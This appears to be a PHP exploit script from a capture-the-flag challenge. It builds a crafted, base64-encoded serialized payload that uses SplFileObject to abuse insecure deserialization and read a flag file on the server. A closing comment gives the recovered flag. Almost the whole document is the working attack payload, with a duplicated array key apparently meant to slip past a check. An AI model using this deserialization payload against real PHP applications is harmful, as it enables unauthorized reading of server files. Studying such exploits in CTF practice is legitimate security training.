<?php 

class main {}

class do_nothing{
    public $a = 1;
    public $b = "SplFileObject";
}


$dnth = new do_nothing();


$m = new main();
$m -> class = new do_nothing();
$m -> param = "./ahyeah_flag_here_cat_me_plss/flag.php";

#echo serialize(array(1 => $m, 2 => 2));
echo base64_encode('a:2:{i:1;O:4:"main":2:{s:5:"class";O:10:"do_nothing":2:{s:1:"a";i:1;s:1:"b";s:13:"SplFileObject";}s:5:"param";s:39:"./ahyeah_flag_here_cat_me_plss/flag.php";}i:1;i:2;}');

# <?php $flag = 'FPTUHacking{Ch4ll nhu n4y c0 d0n kh0ng h1h1 !!!}';?>